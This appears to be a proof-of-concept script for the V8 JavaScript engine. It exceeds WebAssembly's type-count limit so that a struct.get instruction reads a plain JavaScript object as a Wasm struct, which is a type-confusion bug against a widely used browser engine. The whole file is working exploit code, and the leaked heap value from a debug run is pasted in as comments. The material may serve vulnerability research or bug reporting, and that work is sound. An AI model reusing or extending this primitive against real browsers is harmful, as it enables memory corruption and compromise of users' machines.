d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
const builder = new WasmModuleBuilder();
// fill up user defined types in a rec group, 
// so that the total ##type groups## is below kV8MaxWasmTypes
builder.startRecGroup(); // reduce the kV8MaxWasmTypes to 1000
for (let i = 0; i < 1000000; i++) { // make it convenient to debug
  builder.addType(makeSig([kWasmI32, kWasmI32, kWasmI32], [kWasmI32]));
}
builder.endRecGroup();

// 1005 types, 6 structs
for (let i = 0; i <= 5; i++) { builder.addStruct([makeField(kWasmI32, true)]);} 

// tStruct is 1006, same with kWasmExternRef
let tStruct = builder.addStruct([
  makeField(kWasmI32, true), // 0x50, 0x00, 0x5f, 0x01, 0x7f, 0x01
]);
// return this.types.length - 1 = 1007 - 1 = 1006

// create function type has kWasmExternRef as input, ret addr
let tFunc = builder.addType(makeSig([kWasmExternRef], [kWasmI32]));

builder.addFunction('main', tFunc).addBody([
  kExprLocalGet, 0,
  // use `wasmSignedLeb` to wrap a value large than 0xFF
  // ...wasmSignedLeb(tStruct) ----> 238(0xEE),7(0x07)
  kGCPrefix, kExprStructGet, ...wasmSignedLeb(tStruct), 0,
  //   kExprI32Const, 40,
  //   kGCPrefix, kExprStructGet, ...wasmSignedLeb(tStruct), 0,
]).exportFunc();

const instance = builder.instantiate();
let sb = {foo:42};
instance.exports.main(sb);
%DebugPrint(sb);
// DebugPrint: 0x15e8001c4a6d: [JS_OBJECT_TYPE]
//  - map: 0x15e8002c91fd <Map[16](HOLEY_ELEMENTS)> [FastProperties]
//  - prototype: 0x15e8002846c5 <Object map = 0x15e800283d01>
//  - elements: 0x15e8000006f5 <FixedArray[0]> [HOLEY_ELEMENTS]
//  - properties: 0x15e8000006f5 <FixedArray[0]>
//  - All own properties (excluding elements): {
//     0x15e800298e05: [String] in OldSpace: #foo: 42 (const data field 0), location: in-object
//  }
// 0x15e8002c91fd: [Map] in OldSpace
//  - map: 0x15e8002837d5 <MetaMap (0x15e800283825 <NativeContext[287]>)>
//  - type: JS_OBJECT_TYPE
//  - instance size: 16
//  - inobject properties: 1
//  - unused property fields: 0
//  - elements kind: HOLEY_ELEMENTS
//  - enum length: invalid
//  - stable_map
//  - back pointer: 0x15e8002a81c1 <Map[16](HOLEY_ELEMENTS)>
//  - prototype_validity cell: 0x15e800000a59 <Cell value= 1>
//  - instance descriptors (own) #1: 0x15e8001c4a7d <DescriptorArray[1]>
//  - prototype: 0x15e8002846c5 <Object map = 0x15e800283d01>
//  - constructor: 0x15e800284209 <JSFunction Object (sfi = 0x15e800115341)>
//  - dependent code: 0x15e800000705 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
//  - construction counter: 0

%DebugPrint(instance.exports.main(sb));
// DebugPrint: Smi: 0x6f5 (1781) 得到了函数返回值
%DebugPrint(sb.foo);